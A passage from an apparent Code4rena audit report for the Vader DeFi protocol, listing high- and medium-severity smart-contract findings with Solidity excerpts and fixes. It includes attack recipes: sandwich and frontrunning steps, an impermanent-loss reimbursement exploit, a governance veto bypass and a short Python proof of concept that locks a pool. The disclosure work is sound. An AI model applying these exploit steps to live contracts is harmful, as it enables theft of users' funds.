However, the protocol calculates it as `(sumUSD * token.decimals()) / sumNative` which gives us a `SUSHI^2 / (USD*USDV)` denominated result. This seems incorrect.

I'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>

Similar working implementation listed below:

*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211>
*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

To calculate the correct consultation of a given token, the result should return `sumUSD * token.decimals() * sumNative` instead to ensure the target token to consult is denominated in `USD` and contains the correct number of decimals."
52.md,VaderPoolV2.mintFungible exposes users to unlimited slippage,high,"#### Impact

Frontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2.

#### Proof of Concept

Users can provide liquidity to `VaderPoolV2` through the `mintFungible` function.

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L271-L335>

This allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.

However there's no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot of `nativeAsset` but very little `foreignAsset`, the frontrunner can then sell a lot of `nativeAsset` to the pool to devalue it.

Once this is done the attacker returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liqudity.

#### Recommended Mitigation Steps

Add a user-specified minimum amount of LP tokens to mint.


>Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:
> - The code deviates from the Thorchain implementation
> - A test case is created that illustrates the problem

>While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise.

>An additional note on this point is that any behaviour that the Thorchain model applies is expected to be the intended design in our protocol as well.

> An important example is the slippage a user incurs on joining a particular LP pool for which there is no check as there can't be any. Enforcing an LP unit based check here is meaningless given that LP units represent a share that greatly fluctuates (1 unit of LP out of 100 units is different than 1 out of 1000, however, a slippage check for 100 units of DAI for example is valid)."
52.md,Newly Registered Assets Skew Consultation Results,high,"#### Impact

The `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.

If a new asset is added by first registering the token pair and aggregator, the consultation result for that token pair will remain skewed until the next update interval. This is due to the fact that the native asset amount will return `0` due to the default `price1Average` value being used. However, the Chainlink oracle will return a valid result. As a result, the query will be skewed in favour of `sumUSD` resulting in incorrect consultations.

I'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L314>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L322-L369>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

Consider performing proper checks to ensure that if `pairData.price1Average._x == 0`, then the Chainlink aggregator is not queried and not added to `sumUSD`. Additionally, it may be useful to fix the current check to assert that the `pairData.price1Average.mul(1).decode144()` result is not `0`, found [here](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L129-L132). `require(sumNative != 0)` is used to assert this, however, this should be `require(pairData.price1Average.mul(1).decode144() != 0)` instead.


>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Unused slippage params,high,"#### Impact

Unused slippage params.
function `addLiquidity` in VaderRouter (both V1 and V2) do not use slippage parameters:

```solidity
 uint256, // amountAMin = unused
 uint256, // amountBMin = unused
```

making it susceptible to sandwich attacks / MEV.
For a more detailed explanation, see: <https://github.com/code-423n4/2021-09-bvecvx-findings/issues/57>

#### Recommended Mitigation Steps

Consider paying some attention to the slippage to reduce possible manipulation attacks from mempool snipers."
52.md,Covering impermanent loss allows profiting off asymmetric liquidity provision at expense of reserve holdings,high,"#### Impact

Pool funds will be siphoned out over time as swaps and asymmetric LP provision are balancing each other economically, while with introduction of IL reimbursement a malicious user can profit immediately from out of balance pool with a swap and profit again from IL coverage. This requires locking liquidity to a pool, but still represents an additional profit without additional risk at expense of reserve funds.

Another variant of exploiting this is to add liquidity in two steps: deposit 1 with 0 slip adjustment, perfectly matching current market price, deposit 2 with more Vader than market price suggests, moving pool out of balance with Vader becoming cheaper, then exiting deposit 1 with profit because slip adjustment reduce deposit 2's share issuance and deposit 1's now has more asset claims than before. Deposit 2 then need to wait and exit after some time.

IL is calculated as ` ((originalAsset * releasedVader) / releasedAsset) + originalVader - ((releasedAsset * releasedVader) / releasedAsset) + releasedVader  `, i.e. original deposit values without taking account of slip adjustment are used, so providing more Vader in deposit 2 leads to greater IL, which this way have 2 parts: market movements related and skewed liquidity provision related. IL covering compensates for slip adjustments this way.

#### Proof of Concept

The steps to reproduce are:

1.  add asymmetric LP via mint (with NFT),
2.  either swap gathering profit from pool skew or do symmetric deposit beforehand and exit it now
3.  wait for some period for IL protection to be enabled, then withdraw, having IL covered by reserve fund

Router addLiquidity:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L114>

NFT mint:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L168>

Router removeLiquidity:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L227>

NFT burn:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L237>

IL calculation:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L73>

#### Recommended Mitigation Steps

Asymmetric liquidity provision doesn't provide much business value, introducing substantial attack surface, so the core recommendation here is to remove a possibility to add liquidity asymmetrically: instead of penalizing LP with slip adjustment do biggest liquidity addition with 0 slip adjustment that user provided funds allow, and return the remaining part.

This will also guard against cases when user added liquidity with big slip adjustment penalty without malicious intent, not realizing that this penalty will take place, an effect that poses reputational risk to any project using the approach.

Allowing only symmetric liquidity addition removes the described attack surface."
52.md,Mixing different types of LP shares can lead to losses for Synth holders,high,"#### Impact

Users that mint Synths do not get pool shares, so exiting of normal LP can lead to their losses as no funds can be left for retrieval.

#### Proof of Concept

3 types of mint/burn: NFT, Fungible and Synths. Synths are most vilnerable as they do not have share: LP own the pool, so Synth's funds are lost in scenarios similar to:

1.  LP deposit both sides to a pool
2.  Synth deposit and mint a Synth
3.  LP withdraws all as she owns all the pool liquidity, even when provided only part of it
4.  Synth can't withdraw as no assets left

burn NFT LP:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L270>

burn fungible LP:
<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L374>

#### Recommended Mitigation Steps

Take into account liquidity that was provided by Synth minting."
52.md,Incorrect Accrual Of `sumNative` and `sumUSD` In Producing Consultation Results,high,"#### Impact

The `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.

Let's say we wanted to query the price of `USDV`, we would sum up any token pair where `USDV == pairData.token0`.

The sum consists of the following:

*   Price of `USDV` denominated in terms of `token1` (`USDV/token1`).
*   Price of token1 denominated in terms of `USD` (`token1/USD`).

Consider the following example:

*   `SUSHI` and `UNISWAP` are the only registered token pairs that exist alongside `USDV`.
*   Hence, calculating `sumNative` gives us an exchange rate that is denominated as the sum of `USDV/SUSHI` and `USDV/UNISWAP`.
*   Similarly, `sumUSD` gives us the following denominated pairs, `SUSHI/USD` and `UNISWAP/USD`.
*   Summing `sumUSD` and `sumNative` produces an entirely incorrect result as compared to multiplying the two results first and then summing.
*   The issue is equivalent to the same issue as performing `(p1 + p2)*(q1 + q2)` as compared to `(p1*q1 + p2*q2)`. Obviously, these two results are not equivalent, however, the `consult()` function treats them as such.
*   If we multiply the native price and Chainlink oracle results, then we can correctly calculate the price as such; `(SUSHI/USD * USDV/SUSHI + UNISWAP/USD * USDV/UNISWAP) / 2`, which should correctly give us the correct denomination and average price.

However, the protocol calculates it as `((SUSHI/USD + UNISWAP/USD) * token.decimals()) / (USDV/SUSHI + USDV/UNISWAP)` which gives us an incorrectly denominated result.

I'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>

Similar working implementation listed below:

*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211>
*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

To calculate the correct consultation of a given token, the returned result should consist of a sum of `priceUSD * token.decimals() * priceNative` divided by the number of calculations. This should correctly take the average token pair price.

The following snippet of code details the relevant fix:

        function consult(address token) public view returns (uint256 result) {
            uint256 pairCount = _pairs.length;

            for (uint256 i = 0; i < pairCount; i++) {
                PairData memory pairData = _pairs[i];

                if (token == pairData.token0) {
                    //
                    // TODO - Review:
                    //   Verify price1Average is amount of USDV against 1 unit of token1
                    //

                    priceNative = pairData.price1Average.mul(1).decode144(); // native asset amount
                    if (pairData.price1Average._x != 0) {
                        require(priceNative != 0);
                    } else {
                        continue; // should skip newly registered assets that have not been updated yet.
                    }

                    (
                        uint80 roundID,
                        int256 price,
                        ,
                        ,
                        uint80 answeredInRound
                    ) = AggregatorV3Interface(_aggregators[pairData.token1])
                            .latestRoundData();

                    require(
                        answeredInRound >= roundID,
                        ""TwapOracle::consult: stale chainlink price""
                    );
                    require(
                        price != 0,
                        ""TwapOracle::consult: chainlink malfunction""
                    );
                    priceUSD = uint256(price) * (10**10);
                    result += ((priceUSD * IERC20Metadata(token).decimals()) * priceNative);
                }
            }
            require(sumNative != 0, ""TwapOracle::consult: Sum of native is zero"");
            return result;
        }

 
>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Unbounded loop in TwapOracle.update can result in oracle being locked,medium,"#### Impact

Loss of ability of `TwapOracle` to update should too many pools be added.

#### Proof of Concept

`TwapOracle` allows an unlimited number of pairs to be added and has no way of removing pairs after the fact. At the same time `TwapOracle.update` iterates through all pairs in order to update value for each pair.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L322-L369>

`TwapOracle.registerPair` is a permissioned function so that only the owner can add new pairs however should the owner account be compromised or not mindful of the number of pairs being added it is possible to put the oracle into a state in which it is unable to update. The oracle cannot recover from this state.

#### Recommended Mitigation Steps

Possible options:

*   Add a method to stop tracking a particular pair
*   Allow updating a subset of all pairs at a time."
52.md,Should a Chainlink aggregator become stuck in a stale state then TwapOracle will become irrecoverably broken,medium,"#### Impact

Inability to call `consult` on the TwapOracle and so calculate the exchange rate between USDV and VADER.

#### Proof of Concept

Should any of the Chainlink aggregators used by the TwapOracle becomes stuck in such a state that the check on L143-146 of `TwapOracle.sol` consistently fails (through a botched upgrade, etc.) then the `consult` function will always revert.

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L143-L146>

There is no method to update the address of the aggregator to use so the `TwapOracle` will be irrecoverable.

#### Recommended Mitigation Steps

Allow governance to update the aggregator for a pair (ideally with a timelock.)"
52.md,Permissioned nature of `TwapOracle` allows owner to manipulate oracle,medium,"#### Impact

Potentially frozen or purposefully inaccurate USDV:VADER price feed.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L322>

Only the owner of `TwapOracle` can call `update` on the oracle. Should the owner desire they could cease calling `update` on the oracle for a period. Over this period the relative prices of VADER and USDC will vary.

After some period `timeElapsed` the owner can call `update` again. A TWAP is a lagging indicator and due to the owner ceasing to update the oracle so `timeElapsed` will be very large, therefore we're averaging over a long period into the past resulting in a value which may not be representative of the current USDV:VADER exchange rate.

The owner can therefore selectively update the oracle so to result in prices which allow them to extract value from the system.

#### Recommended Mitigation Steps

Remove the permissioning from `TwapOracle.update`"
52.md,Inconsistent balance when supplying transfer-on-fee or deflationary tokens,medium,"#### Impact

In the contract StakingRewards, the stake function assume that the amount of stakingToken is transferred to the smart contract after calling the safeTransferFrom function (and thus it updates the `\_balances` mapping). However, this may not be true if the stakingToken is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the `\_balances` mapping.

Same can be applied for the withdraw function.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/staking-rewards/StakingRewards.sol#L100-L102>

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

Get the actual received amount by calculating the difference of token balance before and after the transfer. For example:
`uint256 balanceBefore = stakingToken.balanceOf(address(this));
stakingToken.safeTransferFrom(msg.sender, address(this), amount);
uint256 receivedAmount = stakingToken.balanceOf(address(this)) - balanceBefore;
\_totalSupply = \_totalSupply.add(receivedAmount);
\_balances\[msg.sender] = \_balances\[msg.sender].add(receivedAmount);`"
52.md,LinearVesting does not calculate vested amount linearly,medium,"#### Impact

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L261>

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L294>

These calculations are incorrect for linear vesting.

#### Proof of Concept

i.e.
if start amount is 10000, and duration is 100 seconds.
After 50 seconds, user can claim 5000 which is 50%

After another 10 seconds, user need to claim 1000 which is 10%, but current calculation return 500.

#### Tools Used

Manual

#### Recommended Mitigation Steps

Change formula to
`User total amount * (block.timestamp – start) / (vesting duration) – user claimed amount.`"
52.md,add liquidity is vulnerable to sandwich attack,medium,"### add liquidity is vulnerable to MEV

#### Impact

`addLiquidity` in the VaderRouter and VaderRouterV2 contract does not check the minimum liquidity amount. This makes users' funds vulnerable to sandwich attacks.

The team says a minimum amount is not required as the VaderPool supports imbalanced mint. However, imbalanced mint is a helper function of buying tokens and providing to lp. A sandwich attack would take over more than 50% of a transaction in an illiquid pool.

Given the current network environment, most transactions in the mempool would be sandwiched. However, users may avoid this attack if they only send tx through [flashbot RPC](https://medium.com/alchemistcoin/how-to-add-flashbots-protect-rpc-to-your-metamask-3f1412a16787). I consider this is a medium-risk issue.

#### Proof of Concept

[VaderRouterV2.sol#L77-L96](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L77-L96)

That says a user wants to provide 1M ETH in the pool.
Attackers can sandwich this trade as follows:

1.  Buy Vader with 10M ETH and makes ETH extremely cheap
2.  *Put user's tx here* User's tx would first buy a lot Vader and deposit to the pool.
3.  Since ETH becomes even cheaper in the pool. The MEV attacker buyback ETH and get profit.

#### Tools Used

None

#### Recommended Mitigation Steps

Always check how much liquidity a user received in a transaction. A tx would not be sandwiched if it's not profitable.

We could learn a lot about MEV from [Robert Miller'tweets](https://twitter.com/bertcmiller)."
52.md,"Missing hasStarted modifier, can lead to user vesting before the owner begin the vesting",medium,"#### Impact

In the `claimConverted()` function, the user can vest their vader token for a certain amount of time, but `hasStarted` modifier is missing,
this can lead to `claimConverted()` function is callable by anyone, and the user can claim eventhough the vesting havent been started by the owner.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L158>

#### Recommended Mitigation Steps

add hasStarted modifier"
52.md,User may not receive the full amount of IL compensation,medium,"#### Impact

The user would not get full IL compensation if there's not enough funds in the reserve.
[VaderReserve.sol#L76-L91](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/reserve/VaderReserve.sol#L76-L91)

VaderReserve.sol#L85

```solidity
        uint256 actualAmount = _min(reserve(), amount);
```

While this is reasonable, users should be able to specify the minimum received amount in the transaction. Otherwise, it's vulnerable to some kind of MEV attack.

I consider this is a medium-risk issue.

#### Proof of Concept

The user can not specify a minimum IL compensation in the router.
[VaderRouter.sol#L169-L207](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L169-L207)

The user may not receive the full amount of compensation.
[VaderReserve.sol#L76-L91](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/reserve/VaderReserve.sol#L76-L91)

#### Tools Used

None

#### Recommended Mitigation Steps

Users should be able to protect themselves when burning lp.

Some possible fixes:

1.  Return the actual amount this line `reserve.reimburseImpermanentLoss(msg.sender, coveredloss);`
2.  Checks whether there's slippage. Revert if the user doesn't receive the full amount.

We can add a new parameter in the function.

```solidity
    require(actualCompensation > minimumCompensation);
```

Or we can check the `amountAMin` after receiving the compensation.
( assume tokenA is native token)

```solidity
    require(amountA +actualCompensation > amountAMin);
```"
52.md,The first lp provider can destroy the pool,medium,"#### Impact

First lp provider received liquidity amount same as the nativeDeposit amount and decides the rate. If the first lp sets the pool's rate to an extreme value no one can deposit to the pool afterward. (please refer to the proof of concept section)

A malicious attacker can DOS the system by back-running the `setTokenSupport` and setting the pools' price to the extreme.
I consider this is a medium-risk issue.

#### Proof of Concept

```python

    deposit_amount = 1000 * 10**18
    get_token(dai, user, deposit_amount*3)
    get_token(vader, user, deposit_amount*3)
    dai.functions.approve(pool.address, deposit_amount*3).transact()
    link.functions.approve(pool.address, deposit_amount*3).transact()


    # deposit_amount = 1000 * 10**18

    # # first deposit 1 wei Dai and 1 vader to the pool
    router.functions.addLiquidity(dai.address, vader.address, 1, 10**18, user, 10**18).transact()
    print('received liquidity', pool.functions.positions(0).call()[2])
    # output log:
    # 1000000000000000000

    # normally deposit to the pool
    router.functions.addLiquidity(dai.address, vader.address, deposit_amount, deposit_amount, user, 10**18).transact()
    print('received liquidity', pool.functions.positions(1).call()[2])

    # output log:
    # 500000000000000000500000000000000000000

    # no one can deposit to the pool now
    # there would be revert

    router.functions.addLiquidity(dai.address, vader.address, 1, deposit_amount, user, 10**18).transact()

```

[VaderMath.sol#L42](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L42)

```solidity
    ((totalPoolUnits * poolUnitFactor) / denominator) * slip
```

Since the scale of the total supply is (10\*\*18)^2, the operation would overflow.

#### Tools Used

None

#### Recommended Mitigation Steps

Set a minimum deposit amount (both asset amount and native amount) for the first lp provider."
52.md,SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS,medium,"#### Impact

The consult function in the contract TwapOracle.sol fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, there are no checks on timeStamp, resulting in stale prices. The oracle wrapper calls out to a chainlink oracle receiving the latestRoundData(). It then checks freshness by verifying that the answer is indeed for the last known round. The returned updatedAt timestamp is not checked.

If there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle (e.g. chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale data (if oracles are unable to submit no new round is started)

#### Proof of Concept

1.  Navigate to ""<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/twap/TwapOracle.sol#L141>"" contract.

2.  consult function does not check timestamp on the latestRoundData.

#### Tools Used

None

#### Recommended Mitigation Steps

Consider to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:

    (uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData();
    require(timeStamp != 0, ""..."");

Consider checking the oracle responses updatedAt value after calling out to chainlinkOracle.latestRoundData() verifying that the result is within an allowed margin of freshness.

- <https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>

- <https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/>


>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,TWAP Oracle inflexible `_updatePeriod`,medium,"#### Impact

Update periods in TWAP oracles reflect risk of an asset.  Updating more frequently accurately prices an asset but increases capabilities of manipulation (which should be harder with more stable assets), whereas longer update periods prevent manipulation but does not accurately price assets (due to the time difference between updates). Volatility of an asset should be considered when calculating update periods. However, in Vader's `TwapOracle.sol` no such considerations are made, the `_updatePeriod` cannot be changed after deployment of the contract. Additionally, each asset uses the same `_updatePeriod`  which does not adequately account for the differences in risk for each asset. This could lead to price manipulation or inadequate pricing of assets.

#### Proof of Concept

[the only chance to set `_updatePeriod`](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L80)

[`_updatePeriod` used in time elapsed calculation](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L345)

#### Recommended Mitigation Steps

Add the following function

    function setUpdatePeriod(uint256 newUpdatePeriod) external onlyOwner {
        require(newUpdatePeriod > minimumUpdatePeriod, ""Update period must be larger than threshold""); // Optional validation based on some risk tolerance
        _updatePeriod = newUpdatePeriod;
    }"
52.md,Missing duplicate veto check,medium,"#### Impact

On the GovernorAlpha contract, function veto has been added. Although the function behaviour is expected, duplicate veto process has not been checked on that function.

#### Proof of Concept

1.  Navigate to following contract line. (<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/governance/GovernorAlpha.sol#L562>)

```
    function veto(uint256 proposalId, bool support) external onlyCouncil {
        ProposalState _state = state(proposalId);
        require(
            _state == ProposalState.Active || _state == ProposalState.Pending,
            ""GovernorAlpha::veto: Proposal can only be vetoed when active""
        );

        Proposal storage proposal = proposals[proposalId];
        address[] memory _targets = proposal.targets;
        for (uint256 i = 0; i < _targets.length; i++) {
            if (_targets[i] == address(this)) {
                revert(
                    ""GovernorAlpha::veto: council cannot veto on proposal having action with address(this) as target""
                );
            }
        }

        VetoStatus storage _vetoStatus = proposal.vetoStatus;
        _vetoStatus.hasBeenVetoed = true;
        _vetoStatus.support = support;

        if (support) {
            queue(proposalId);
        }

        emit ProposalVetoed(proposalId, support);
    }

    /**

```

2.  The veto progress can be completed per proposal twice.

#### Tools Used

None

#### Recommended Mitigation Steps

Consider to check if proposals vetoed before.

```
VetoStatus storage _vetoStatus = proposal.vetoStatus;
require(!_vetoStatus.hasBeenVetoed, ""Vetoed before"");

```"
52.md,`BasePool.mint()` Is Callable By Anyone,medium,"#### Impact

The `BasePool.mint()` function differs from its implementation in `BasePoolV2.mint()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter.addLiquidity()` performs some necessary input validation which can be bypassed by directly calling `BasePool.mint()`.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L123-L150>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

Consider adding an `onlyRouter` modifier to the `BasePool.mint()` function to ensure users cannot directly call this function."
52.md,`BasePool.swap()` Is Callable By Anyone,medium,"#### Impact

The `BasePool.swap()` function differs from its implementation in `BasePoolV2.swap()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter._swap()` performs some necessary input validation which can be bypassed by directly calling `BasePool.swap()`.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L304-L351>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L289-L379>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L261-L268>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

Consider adding an `onlyRouter` modifier to the `BasePool.swap()` functions to ensure users cannot directly call these functions."
52.md,Lacking Validation Of Chainlink' Oracle Queries,medium,"#### Impact

`TwapOracle.consult()` is missing additional validations to ensure that the round is complete and has returned a valid/expected price. The `consult()` improperly casts an `int256 price` to `uint256` without first checking the value. As a result, the variable may underflow and return an unexpected result, potentially causing further issues in other areas of the protocol that rely on this function.

Additionally, the `GasThrottle.validateGas()` modifier utilises Chainlink's `latestAnswer()` function which lacks additional checks for stale data. The `latestRoundData()` function facilitates additional checks and should be used over `latestAnswer()`.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L134-L150>
- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/utils/GasThrottle.sol#L15>
- <https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>

#### Tools Used

Manual code review.
Chainlink best practices.

#### Recommended Mitigation Steps

Consider validating the output of `latestRoundData()` to match the following code snippet:

         (
            uint80 roundID,
            int256 price,
            ,
            uint256 updateTime,
            uint80 answeredInRound
          ) = ETH_CHAINLINK.latestRoundData();
          require(
              answeredInRound >= roundID,
              ""Chainlink Price Stale""
          );
          require(price > 0, ""Chainlink Malfunction"");
          require(updateTime != 0, ""Incomplete round"");

This needs to be updated in `TwapOracle.consult()` and in `GasThrottle.validateGas()`. The latter instance should have the `latestAnswer()` function replaced with `latestRoundData()` in order to avoid stale data.

 
>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Governor's veto protection can be exploited,medium,"The `GovernorAlpha`'s council cannot veto proposals that perform a call to the contract itself.
This can be exploited by malicious proposal creators by appending a new call at the end of their proposal that simply calls an innocent function like `GovernorAlpha.votingDelay()`.

#### Impact

The veto procedure can easily be circumvented, making the council unable to veto.

#### Recommended Mitigation Steps

The veto check must be further restricted by specifying the actual function selector that is not allowed to be vetoed, like `changeCouncil`."
52.md,Vests can be denied,medium,"The `LinearVesting.vestFor` function (which is called by `Converter`) reverts if there already exists a vest for the user:

```solidity
 require(
    vest[user].amount == 0,
    ""LinearVesting::selfVest: Already a vester""
);
```

There's an attack where a griefer frontruns the `vestFor` call and instead vests the smallest unit of VADER for the `user`.
The original transaction will then revert and the vest will be denied

#### Recommended Mitigation Steps

There are several ways to mitigate this.
The most involved one would be to allow several separate vestings per user."
52.md,`TWAPOracle.getRate` does not scale the ratio,medium,"The `TWAPOracle.getRate` function simply performs an integer division to compute the rate.

```solidity
function getRate() public view returns (uint256 result) {
    uint256 tUSDInUSDV = consult(USDV);
    uint256 tUSDInVader = consult(VADER);
    // @audit shouldn't this scale by 1e18 first? otherwise easily 0
    result = tUSDInUSDV / tUSDInVader;
}
```

It should first be scaled by some value, for example, `1e18`.

#### Impact

The rate has no decimal precision and if `tUSDInVader > tUSDInUSDV`, the rate will always be zero.

The `usdvtoVader` and `vaderToUsdv` functions will return incorrect values.

#### Recommended Mitigation Steps

```solidity
// return as a rate with 18 decimals instead
result = tUSDInUSDV * 1e18 / tUSDInVader;
```


>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Unclear `TwapOracle.consult` algorithm,medium,"The `TWAPOracle.consult` function is unclear to the auditor.
It seems to iterate through all registered pairs that share the `token` parameter (USDV or VADER) and then sums up the foreign token pair per `token` price.
And divides this sum (`sumNative`) by the summed-up USD price of these foreign token pairs (`sumUSD`).

I think the idea is to create some kind of average price but doing it like this does not seem to be effective because large prices are weighted a lot stronger than low prices.

###### Example

Assume there are 3 USDV pairs registered: `(ETH, DAI, USDC)`.

Oracle Price: USDV/ETH 4500, USDV/DAI 1, USDV/USDC 1
Pool price: USDV/ETH 4500, USDV/DAI 10, USDV/USDC 10

Even though the DAI and USDC pool prices are off by 10x, the final result is `4502/4520 = 0.996017699` very close to a price of `1.0` which seems strange.

#### Recommended Mitigation Steps

Document how the algorithm works and make sure it's correct.
Resolve the `TODO`.


>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit."
52.md,Tokens with fee on transfer are not supported,medium,"There are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`, E.g `Vader` token.

In the current implementation, `BasePoolV2.sol#mint()` assumes that the received amount is the same as the transfer amount, and uses it to calculate liquidity units.

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L168-L229>

```solidity
function mint(
    IERC20 foreignAsset,
    uint256 nativeDeposit,
    uint256 foreignDeposit,
    address from,
    address to
)
    external
    override
    nonReentrant
    onlyRouter
    supportedToken(foreignAsset)
    returns (uint256 liquidity)
{
    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(
        foreignAsset
    ); // gas savings

    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);
    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);

    PairInfo storage pair = pairInfo[foreignAsset];
    uint256 totalLiquidityUnits = pair.totalSupply;
    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;
    else
        liquidity = VaderMath.calculateLiquidityUnits(
            nativeDeposit,
            reserveNative,
            foreignDeposit,
            reserveForeign,
            totalLiquidityUnits
        );

    require(
